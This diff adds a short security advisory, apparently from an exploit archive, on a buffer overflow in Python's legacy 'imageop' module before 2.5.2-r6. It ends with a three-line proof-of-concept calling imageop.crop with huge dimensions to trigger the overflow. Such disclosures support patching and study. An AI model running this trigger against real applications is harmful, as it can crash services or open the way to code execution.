@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/31932/info
+
+Python's 'imageop' module is prone to a buffer-overflow vulnerability.
+
+Successful exploits may allow attackers to execute arbitrary code in the context of applications using the vulnerable Python modules. This may result in a compromise of the underlying system. Failed attempts may lead to a denial-of-service condition.
+
+These issues affect versions prior to Python 2.5.2-r6. 
+
+import imageop
+s = ''
+imageop.crop(s, 1, 65536, 65536, 0, 0, 65536, 65536) 
